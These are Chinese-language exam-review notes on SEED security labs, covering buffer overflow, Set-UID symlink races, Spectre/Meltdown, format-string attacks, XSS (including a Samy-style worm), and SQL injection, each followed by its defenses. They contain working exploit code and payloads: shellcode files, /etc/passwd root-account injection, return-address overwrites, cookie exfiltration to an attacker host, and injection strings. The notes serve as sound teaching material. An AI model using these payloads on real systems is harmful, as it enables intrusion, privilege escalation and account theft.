1　栈溢出：把返回地址改成我的代码

1.1 原理：函数是怎么「返回」的

函数调用时，CPU 把「返回后该执行哪条指令」的地址（返回地址 ret）压在栈上，再把旧的 ebp 压栈，然后给局部变量分配空间。函数结束时执行 leave; ret：ret 就是把栈顶那 4/8 个字节当作地址跳过去。

问题出在 strcpy(buffer, str)：它只管复制到 \0 为止，完全不看 buffer 有多大。只要 str 比 buffer 长，多出来的字节就会沿着栈往上写，依次盖掉「保存的 ebp」和「返回地址」。

图 1　栈帧布局与 offset 的由来：buffer 到 ret 之间只隔着「保存的 ebp」
核心公式：offset = (ebp − buffer) + 4（32 位）；64 位把 +4 换成 +8，因为 ret 占 8 字节。
小测原题代入：程序打印 buffer = 0x00BBCC00、ebp = 0x00BBCD00 → offset = 0xBBCD00 − 0xBBCC00 + 4 = 0x104，也就是第 260 字节开始写返回地址。

1.2 代码：badfile 是怎么拼出来的

攻击脚本不发送字符串，而是生成一个二进制文件 badfile（517 字节），再由程序读进 str 交给 strcpy。它由四段拼成：

图 2　badfile 的四段结构：NOP sled + shellcode + 填充 + 覆盖用的返回地址
content = bytearray(0x90 for i in range(517))      # ① 先全填 NOP
start = 517 - len(shellcode)                        # ② shellcode 贴尾部
content[start:start+len(shellcode)] = shellcode
ret = 0xffffd398                                    # ③ 指向 sled 中部
content[116:120] = (ret).to_bytes(4,'little')       # ④ 在 offset 处写 ret（小端）

为什么用 NOP sled？因为 ASLR 关闭时地址虽固定，但只要 shellcode 前面铺满 0x90，返回地址只要是「sled 里任意一格」就能安全滑到 shellcode，容错率大幅提高。

1.4 小测原题（投屏那道）

Q1（10 分）程序如何获取 str 与 buffer 的地址？
程序里 printf("buffer: %p, ebp: %p") 之类把 buffer 与 ebp 打印出来；str 是接收输入的缓冲区，地址 = buffer 本身，buffer 与 ret 之间的差由 ebp 给出。答辩时要说清楚：打印这两个值就等于把栈布局告诉了攻击者，这是信息泄漏。

Q2（60 分）构造一次成功的输入：题目只给了 buffer = 0xAABB8D00，ebp = 0xAABB8**0——ebp 被打码了，说明帧大小不确定。所以不能只写一个 ret，而要把所有可能的返回地址槽位都填成同一个跳转地址：ret = 0xAABB8D24 + 0x10·n，跳转目标取 0xAABB9004，shellcode 放最后 [960,1000]，其余全填 NOP。要点：① 用栈示意图说明 buffer/ebp/ret 三层；② 说明 为什么「全部填满」比「精确算一个」更稳；③ 小端字节序。

Q3（30 分）地址完整给出时：buffer = 0x00BBCC00、ebp = 0x00BBCD00 → offset = 0x104，ret 写 0x00BBCC04（buffer+4，指向自己的 shellcode 区），shellcode 放 payload 开头 [4, …]，中间填 NOP。

1.5 防御：三道关卡分别拦住什么

  • StackGuard（canary）：在 ret 前插入随机哨兵值，函数返回前校验；被溢出改写 → 报 stack smashing detected 并 abort。拦住「覆盖 ret」这件事本身。
  • NX / DEP（编译时去掉 -z execstack）：栈不可执行，跳到栈上的 shellcode 直接 SIGSEGV。拦住「执行注入代码」，但改 ret 仍可 ROP。
  • ASLR / PIE：栈与代码地址随机化，攻击者不知道往哪跳，只能爆破或先泄漏地址。

2　Set-UID 与 TOCTOU：检查的和使用的不是同一个东西

2.1 先搞清楚 Set-UID 的两个身份

真实 UID（real UID）：你是谁，getuid()，由启动进程的用户决定。
有效 UID（effective UID）：系统按谁的身份给你判权限，geteuid()。
Set-UID 程序（chmod 4755）被 seed 执行时：real = 1000(seed)，effective = 0(root)。所以它内部做任何文件操作都按 root 判权限——所有漏洞的严重性都来自这一句。

vulp 程序的逻辑：先用 access(fn, W_OK) 判断「我能不能写」，通过后用 fopen(fn, "a+") 打开。看起来无懈可击，但这两个调用用的身份不一样：

  • access() 用的是真实 UID（seed）——所以普通文件能通过检查；
  • fopen() 用的是有效 UID（root）——所以它能写 root 的文件。

两者之间隔着一个时间窗口。攻击者要做的，就是在这个窗口里把 /tmp/XYZ 从「自己的普通文件」换成「指向 /etc/passwd 的软链」。

图 3　TOCTOU：检查时刻看到的是 A，使用时刻打开的却是 B
echo "dummy" > /tmp/XYZ                    # ① 先让 access 通过
rm -f /tmp/XYZ                             # ② 窗口期：删掉
ln -s /etc/passwd /tmp/XYZ                 #    换成指向 /etc/passwd 的软链
# ③ 程序 fopen 时以 root 打开 → 追加成功

手工敲命令抢窗口太慢，稳定做法是写个循环不停地换；而 unlink()+symlink() 本身仍是两步、依然有窗口，所以更稳的是 renameat2(…, RENAME_EXCHANGE)——一次系统调用原子交换两个路径：

X = "/tmp/XYZ"; A = "/tmp/ABC"
unlink(X); symlink("/dev/null", X);        # XYZ 指向无害文件
unlink(A); symlink("/etc/passwd", A);      # ABC 指向目标
while (1) renameat2(0, X, 0, A, RENAME_EXCHANGE);   # 原子地来回换

追加到 /etc/passwd 的那一行，就是攻击者拿到 root 的方式（密码哈希留空，UID 填 0）：

test:U6aMy0wojraho:0:0:test:/root:/bin/bash

2.2 防御一：最小权限（改程序）

思路：让检查和打开都以 seed 的身份完成，只在真正要写的时候短暂提权，而且写之前已经拿到 fd，路径再怎么换也没用。

uid_t real = getuid(), eff = geteuid();
seteuid(real);                     // ① 降权：access 和 fopen 都以 seed 身份执行
if (!access(fn, W_OK)) {
    fp = fopen(fn, "a+");          // 此时即使 fn 变成软链，也以 seed 身份打开 → 失败
    seteuid(eff);                  // ② 打开成功后才提权
    fwrite(...); fclose(fp);
    seteuid(real);                 // ③ 写完立刻降回
}

2.3 防御二：fs.protected_symlinks=1（改内核）

内核在跟随软链时额外做三个检查，只有「同时满足」才拒绝：

  • ① 软链所在目录是全局可写 + 粘滞位（如 /tmp，权限 1777）；
  • ② 软链的属主与进程有效 UID 不一致；
  • ③ 软链所在目录的属主与进程有效 UID 也不一致。

局限性（考试爱问）：只保护 sticky 的世界可写目录；只防符号链接不防硬链接；依赖属主比较（若攻击者与目标同属主就失效）；不防其它类型的 TOCTOU（比如换文件内容而不是换链接）。

2.4 小测 A：lstat 判类型的那个程序

题目：root 拥有、Set-UID，只允许给「调用者本人的普通文件」追加输入。代码用 lstat(fn,&st) 检查 S_ISREG 与 st.st_uid == getuid()，通过后 fopen(fn,"a") 写入。程序员说：「拒绝了软链又查了属主，所以不可能改 root 的文件。」

(a) 说法对吗？A、C 执行时 XYZ 应指向什么？　错。A（lstat 时）必须让它指向 seed 自己的普通文件，否则检查不过；C（fopen 时）则应指向 /etc/protected——中间被换掉了。检查的和使用的是两个不同的对象，这就是全部问题。

(b) 构造执行时序：touch /tmp/quiz/XYZ（普通文件，uid=1000）→ 程序 lstat 通过 → 攻击者 rm XYZ; ln -s /etc/protected XYZ → 程序 fopen(fn,"a") 以 root 打开 /etc/protected 并写入。

(c) C 前再加一次 lstat 能消除漏洞吗？　不能。仍在「最后一次 lstat → fopen」之间留窗口，只是窗口更窄、更难抢；只要检查和使用是两个按名字进行的独立系统调用，就永远有 TOCTOU。

(d) 在 C 之后、D 之前替换 XYZ，能写到另一个文件吗？　不能。D 用的是已经拿到的 fp，它绑定的是打开那一刻的 inode，与路径名再无关系。启示：应该用 fstat(fileno(fp), &st) 校验已经打开的 fd，而不是校验文件名。

2.5 小测 B：reportdesk 的三个洞

① 前缀比较可穿越：if (strncmp(argv[1], "/opt/lab/reports/", 17) != 0) return 1; 只比较前 17 个字符，于是
argv[1] = "/opt/lab/reports/../../../etc/passwd" 能通过检查，随后 open(argv[1], O_RDONLY) 读出 任意文件。修法：用 realpath() 规范化后再比，或用 openat。

② logfd 泄漏：open(audit, …) 得到的 fd 若没有 O_CLOEXEC，会随 execve 被 shell 继承，于是 echo "Hello World!" >&3 就能以 root 身份写任意文件。本题代码带了 O_CLOEXEC，所以这一条不成立——答题时要把这个判断说出来。

③ REPORT_AUDIT 可控：getenv("REPORT_AUDIT") 由用户环境变量决定，把它设成 /etc/passwd，程序就会把 "VIEW\n" 追加进去，污染任意文件。修法：白名单固定路径，不信任 env。

3　Spectre 与 Meltdown：靠「时间差」偷数据

3.1 前置知识：为什么时间能泄漏信息

CPU 访问内存时，命中 cache 只要几十个周期，没命中要走内存，要几百个周期。于是「某块数据快不快」就暴露了「它有没有被访问过」。

Flush+Reload 是最常用的手法，三步：① 用 _mm_clflush(&addr) 把目标从 cache 里踢掉；② 触发受害代码；③ 用 clock_gettime 计时重新读它——快就说明受害代码在 ② 里碰过它。

图 4　Flush+Reload：把「有没有被访问」变成「读得快不快」

3.2 Spectre：训练分支预测，让它替我越界读

程序里有个越界访问 if (x < array_size) array[x]，正常永远进不去。但 CPU 的分支预测会猜「条件成立」，于是提前把 array[x*4096 + DELTA] 读进 cache；等发现猜错时，结果被丢弃、寄存器回滚——但 cache 里的痕迹不会回滚。我们只要逐页 reload，看哪一页最快，就知道 array_size 后面的秘密字节是多少。

图 5　Spectre 四步：训练 → 越界 → 污染 cache → 计时还原
// ① 训练（循环 10 次，每次先清掉 size 的缓存）
for (i = 0; i < 10; i++) { _mm_clflush(&size); victim(i); }
// ② 传一个越界下标；③ CPU 预测「仍小于」，乱序执行 array[s*4096 + DELTA] += 88
s = restrictedAccess(index_beyond);
// ④ reload 全部 256 页，得分最高者为秘密字节
for (i = 1; i < 256; i++) { t = time(array[i*4096 + DELTA]); if (t < 阈值) scores[i]++ }

三个「反直觉」的实验现象，正是考点

改动现象原因（答辩必答）
注释掉 _mm_clflush(&size)成功率断崖式下降size 还在 cache 里，CPU 读取它只要几十周期，来得及算完再判断，根本不需要投机执行
把 victim(i) 改成 victim(i+20)完全失败训练的是「数组下标总比 size 大」这个方向，于是 CPU 预测的正是「越界」，而越界结果本来就不需要被丢弃——没有投机窗口可钻
不改 max 的初值最高分总是 0restrictedAccess 返回 0 时执行了 array[0*4096+DELTA] += 88，第 0 页被缓存，抢占最高分；所以 max 与循环都从 1 开始

另外两个细节：printf("*****") 看起来无用，实际是给投机执行留出时间窗口，删掉就失败；usleep 取 10 / 100 / 1000 都能 10/10 成功。逐字节读 17 次（index_beyond++）就把整个 secret 字符串读出来了。

3.3 Meltdown：不等预测，直接抢在异常之前

Meltdown 更暴力：直接读内核地址。访问会产生异常（#PF），但 CPU 是流水线的，异常被处理之前，后面依赖这条数据的指令（array[k*4096]）已经乱序执行、把页拉进了 cache。只要用 setjmp/longjmp 捕获 SIGSEGV 恢复现场，再 reload 就能读出内核内存。

图 6　Meltdown：异常发生之前，数据已经被「偷」进了 cache

3.4 两者的共同点、不同点（小测原题）

共同点：都利用了 CPU 的乱序执行 / 投机执行，都用侧信道（Flush+Reload）把「乱序执行留下的 cache 痕迹」翻译成数据；本质都是「算过了但假装没算」。

不同点：
① 攻击对象：Meltdown 读内核 / 其它进程的内存（跨权限边界）；Spectre 读同进程、沙盒内的数据（越界）。
② 是否需训练：Meltdown 不需要训练，靠的是「异常检查晚于数据读取」这个硬件缺陷；Spectre 必须多轮训练分支预测器，让它相信条件成立。
③ 依赖的缺陷：Meltdown 是权限检查与数据读取的时序漏洞；Spectre 是分支预测 + 越界检查的时序漏洞。

防御：KPTI/KAISER（内核页表在用户态不可见，Meltdown 失效）、lfence 等序列化指令（切断投机）、编译器插入防护、微码/硬件修复（IBRS/IBPB）。

4　格式化字符串：把数据当成指令用

4.1 原理：%x 从哪拿参数、%n 往哪写

printf(fmt, …) 是变参函数：它靠格式串里的 % 决定「去参数区的第几个槽位取数据、按什么类型解释」。如果 fmt 是用户输入，攻击者就能自己指定去读/写哪个槽位。

  • %x：把槽位内容按十六进制打出来 → 泄漏；
  • %s：把槽位内容当地址，打印该地址处的字符串 → 任意地址读（地址非法则崩溃）；
  • %n：把「到目前为止已输出的字符数」写进槽位指向的地址 → 任意地址写；%hn 写 2 字节，%hhn 写 1 字节。

参数区在哪：32 位全部在栈上；64 位前 6 个在寄存器 rdi, rsi, rdx, rcx, r8, r9，第 7 个起才在栈上。这就是为什么 32 位用几十个 %x、64 位用 %p 也要数到 159 个才能摸到自己的 buffer。

图 7　「第 64 个参数」为什么正好是 buffer：地址放在 buffer 开头，再用 %64$s 解引用
# ① 找偏移：发 64 个 %x，看 0xbfffeeee 第几个出现 → 第 64 个
# ② 任意读：把 0x080b4008 写到 buffer 开头，第 64 个 %x 换成 %s
python3 -c 'print("%x"*63 + "%s", end="")' | nc 10.9.0.5 9090

4.2 任意写：为什么要把 4 个字节拆成 4 次 %hhn

要往 0x080e5068 写一个值，直觉做法是用 %n 一次写完；但 %n 写的是「已输出字符数」，一个 4 字节的数可能高达上亿——意味着程序要先输出上亿个字符，不现实，也常常不允许。

所以拆成 4 个字节：把目标地址 +0/+1/+2/+3 四个地址分别排进 buffer（本实验放在 1000 / 1008 / 1016 / 1024），然后用 %hhn 一次写 1 字节，按数值从小到大排好顺序，相邻两次之间用 %<差值>d 补齐字符数。

图 8　拆字节写内存：4 个地址 → 4 次 %hhn，按高字节到低字节、计数单调递增

为什么地址放在 1000 而不是开头？因为 buffer 一共 1500 字节，格式串本身要占前 1000 字节左右（几十个 %x 就是几百字符），把地址放在 1000 之后既不会被格式串覆盖，又保证「第 64 个参数」正好落在地址区。

4.3 升级：覆盖返回地址，跳到自己写的 shellcode

把目标从「一个变量」换成「myprintf 的返回地址」，思路完全一样，只是地址变了：

  • 32 位：myprintf 的返回地址在 ebp+4 = 0xffffd37c，buf 起始 0xffffd450；shellcode 放在 buf+1200 = 0xffffd900；把 0xffffd37f/7e/7d/7c 四个地址写到 1000 起，用 4 个 %hhn 逐字节写返回地址。
  • 64 位：先用 %p 数到 159 个摸到 buffer；返回地址存在 rsp+8，它的值是 0x7fffffffe380，shellcode 放 +1200 = 0x7fffffffe830；返回地址有 8 字节，但高两字节本来就是 0，所以用 6 个 %hhn 就够。
// 64 位：159-2 个 %p 用来推游标，后面 6 次 %lld + %hhn 逐字节写 8 字节返回地址
s = "%p"*(159-2) + "%174lld"+"%hhn" + "%128lld"+"%hhn" + "%256lld"+"%hhn" \
  + "%256lld"+"%hhn" + "%233lld"+"%hhn" + "%72lld"+"%hhn"

4.4 小测：两个候选返回地址，一次输入都要命中

题目：栈上有 A1、A2 两个可能被用作返回地址的位置，但不知道程序这次用哪个；要求「构造一次即可成功的完整输入」；必须写出完整格式串与每一步累计输出字符数；至少用一次 %hn、一次 %hhn；禁止用 %n；恶意代码只需标注「恶意代码（40 字节）」。

思路：既然不知道用哪个，就让两个位置都变成同一个跳转地址。
① 先把 A1、A2 两个地址都排进 payload；② 用 B − C = 0x40（相差 64 字节 = 16 个参数位）算出 B 处地址区对应的参数序号；③ 对 A1 的 4 个字节依次 %hhn，再对 A2 的 4 个字节再写一遍（同值，所以差值相同，必要时 +256 绕圈）；④ 最后跳转地址指向 payload 里标注的「恶意代码（40 字节）」。

易错点：题目禁止 %n，只能 %hn/%hhn；每写一个字节都要在答案里写出「此刻累计输出了多少字符」，这是本题的给分点。

4.5 防御

一句话：永远不要让用户数据出现在格式串的位置。printf(msg) → printf("%s", msg)；同理 syslog(msg) → syslog("%s", msg)。修复后程序不再崩，攻击也完全不生效。编译器的 -Wformat-security 能帮忙发现这类写法。

5　XSS：让受害者的浏览器替我发请求

5.1 原理与分类

XSS（跨站脚本）：应用把用户输入未经转义地写进 HTML 页面，浏览器把这段数据当成 JavaScript 代码执行，于是攻击者的脚本以受害者的身份、在受害者的会话里运行。它不是「攻击服务器」，而是「借用受害者的浏览器和 cookie」。
类型恶意数据存在哪触发方式
存储型（本实验）存进数据库（profile 的 Brief description）任何用户打开该页面都会执行——所以能做成蠕虫
反射型在 URL 参数里，服务器原样回显诱导受害者点一个构造好的链接
DOM 型不出服务器，前端 JS 直接把输入塞进 innerHTML页面脚本自己处理不当

Elgg 是个社交网站，攻击目标就是复刻 2005 年的 Samy 蠕虫：受害者一旦看了攻击者的主页，就（1）自动加攻击者为好友、（2）把自己的主页也变成蠕虫的副本，（3）继续传染下一个人。

图 9　XSS 攻击链：注入 → 执行 → 读 token → 伪造请求 → 自我复制

5.2 第 1–3 关：从弹窗到偷 cookie

<script>alert('XSS');</script>                                  # ① 证明能执行
<script>alert(document.cookie);</script>                        # ② 看到会话 cookie
<script>document.write('<img src=http://10.9.0.1:5555?c='
  + escape(document.cookie) + ' >');</script>                   # ③ 外带
# 攻击机上： nc -l 5555      ← 用  是为了「静默」发请求（不会被弹窗打断）

为什么用 <img src=…> 而不是 fetch：图片请求不受同源策略限制，也不需要在页面上留痕迹，是最经典的 cookie 外带手法。

5.3 第 4 关：加好友——为什么必须带 CSRF token

Elgg 每个「会改状态」的请求都要带两个值：__elgg_ts（时间戳）与 __elgg_token（会话令牌）。这是 CSRF 防护：防止别的站点伪造请求。但我们的脚本是在目标站点自己的页面里运行的（同源），于是它可以直接读到这两个值，构造出一个完全合法的请求。

<script type="text/javascript">
window.onload = function () {
  var ts    = "&__elgg_ts="    + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var url   = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
  var x = new XMLHttpRequest();
  x.open("GET", url, true); x.send();
};
</script>

Q：为什么要取 __elgg_ts 和 __elgg_token？
绕过服务器的 CSRF 防护。没有这两个值，伪造的 AJAX 请求会被服务器判为伪造而拒绝；有了它们，请求在服务器看来就是「当前登录用户本人发起的」。

Q：如果把同样的脚本写进 "About me" 文本框，能成功吗？
不能。该字段会被过滤/转义（按 HTML 文本渲染），<script> 只作为文字显示而不会执行——能不能注入，取决于输出时有没有转义。

5.4 第 5 关：改资料——为什么要跳过自己

var content = ts + token
  + "&guid=" + elgg.session.user.guid          // 受害者自己的 ID
  + "&name=" + elgg.session.user.name
  + "&description=Modified HAHA&accesslevel[description]=2";
if (elgg.session.user.guid != 59) {            // 59 是 Samy 自己
  var x = new XMLHttpRequest();
  x.open("POST", "http://www.seed-server.com/action/profile/edit", true);
  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  x.send(content);
}

Q：为什么加 if (elgg.session.user.guid != 59)？
防止 Samy 打开自己的主页时，脚本把他自己的 profile 也改成 "Modified HAHA"，覆盖掉原来的蠕虫代码，导致传播链断掉。

5.5 第 6 关：自复制蠕虫

var header = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;  // 取到自己的代码
var tail   = "</" + "script>";                           // 拆开写，避免被解析器提前闭合
var wormCode = encodeURIComponent(header + jsCode + tail); // URL 编码后放进表单
// ① 写进受害者的 description（植入副本）  ② 再发一次加好友请求（建立传播边）

三个细节：用 id="worm" 定位自己；用 "</" + "script>" 拼接尾部（否则浏览器的 HTML 解析器会在代码里就把 </script> 当成结束标签）；用 encodeURIComponent 保证放进表单时特殊字符不破坏请求。

5.6 第 7 关：CSP 逐条解释（小测给分点）

策略实验现象原因

CSP 为什么能防 XSS：它让服务器明确声明「哪些来源的脚本可信」，并且默认拒绝内联——注入的 <script>、onclick=、javascript: 只要不在白名单或没有正确 nonce，就根本不会执行。这才是从根因（数据被当代码）上解决，而不仅是被动转义。

6　SQL 注入：让数据库把我的输入当成语句

6.1 原理：字符串拼接把「数据」升级成了「语法」

程序这样拼 SQL："SELECT … FROM credential WHERE name= '$uname' and Password='$pwd'"。正常输入时，$uname 落在两个引号之间，数据库只把它当字符串。可一旦输入里带一个单引号 '，这个引号就闭合了字符串，后面的内容就不再是数据，而是 SQL 语句的一部分。

图 10　一个单引号 + 一个注释符，就把密码条件变成了注释

6.2 登录绕过（SELECT 注入）

用户名填 admin'#，密码随便。拼接结果：

SELECT ... FROM credential WHERE name= 'admin'#' and Password='任意值'

命令行等价写法（注意 URL 编码：%27 = '，%23 = #，%20 = 空格）：

curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23&Password=123'

为什么 2.3 的「附加第二条语句」不成功：PHP 的 mysqli::query() 不支持一次执行多条语句（只有 mysqli_multi_query() 才会），所以用 ; 拼 UPDATE/DELETE 会被拒绝——这是「防范措施」而不是「语法问题」。

6.3 UPDATE 注入：一次改三样

编辑资料的 SQL 是 UPDATE credential SET nickname='$nick', email='$email', … WHERE ID=$id;。把 nickname 填成带引号的值，就能「关掉」当前字段、插入自己的赋值：

目标nickname 输入拼出来的效果
改自己的工资', salary='1000000SET nickname='', salary='1000000', email=… WHERE ID=1
改别人的工资', salary=1 WHERE name='Boby'; #前半句无效，另起 WHERE name='Boby'，末尾注释掉原 WHERE ID=
改别人的密码', Password='7c4a8d09…' WHERE name='Boby';#直接把 Boby 的密码哈希换成 sha1("123456")

注意最后的 #：不注释掉原句末尾的 WHERE ID=$id，语句会在第一个人身上生效而不是 Boby。

6.4 防御：Prepared Statement 为什么有效

① 编译（prepare）
解析 → 编译 → 优化 → 缓存
WHERE name=? and Password=?
② 绑定（bind）
把用户输入作为纯数据填入
不再参与语法解析
③ 执行（execute）
语句结构已经固定
输入里的 '# 只是字符串
关键：编译发生在数据到达之前。骨架里只有占位符 ?，数据后填，永远无法改变已经被编译好的语句结构。于是 admin'# 会被当成「名字叫 admin'# 的用户」去查，查不到 → 登录失败。
图 11　Prepared Statement：先编译骨架，再绑定数据，代码与数据彻底分开
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential WHERE name=? and Password=?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);   // "ss" = 两个字符串
$stmt->execute();
$result = $stmt->get_result();

其他防御：输入白名单/类型校验；mysqli_real_escape_string / PDO 转义（治标）；数据库账户最小权限（不给 DROP、不给改他人行）；错误信息不回显（避免报错注入）；关掉多语句查询。

7.2 十条最容易丢分的细节

  1. offset 一定要 +4/+8：buffer 到 ret 之间还隔着「保存的 ebp」。
  2. 小端：写地址时低字节在前，to_bytes(4,'little') 别写成 big。
  3. 64 位 shellcode 与 32 位不通用（\xcd\x80 vs \x0f\x05，寄存器也不同）。
  4. TOCTOU 的答案永远是「检查与使用不是同一个时刻」，加一次检查只是缩小窗口，不消除。
  5. fp 一旦打开就绑定 inode，此后换路径名不影响它——这是 (d) 的标准答案。
  6. _mm_clflush 是 Spectre 成立的前提，删掉成功率断崖式下降，原因要能说出「不清缓存就不用投机」。
  7. Spectre 的 max 从 1 开始，否则 0 号页会抢占最高分。
  8. %n 写的是「已输出字符数」；大数必须先拆字节，且写序按数值递增。
  9. XSS 的 token 不是「没用」，而是「正好能被同源脚本读到」——这是它防不住 XSS 的原因。
  10. SQL 注入改密码要写哈希值（7c4a8d09… = sha1("123456")），写明文不生效。
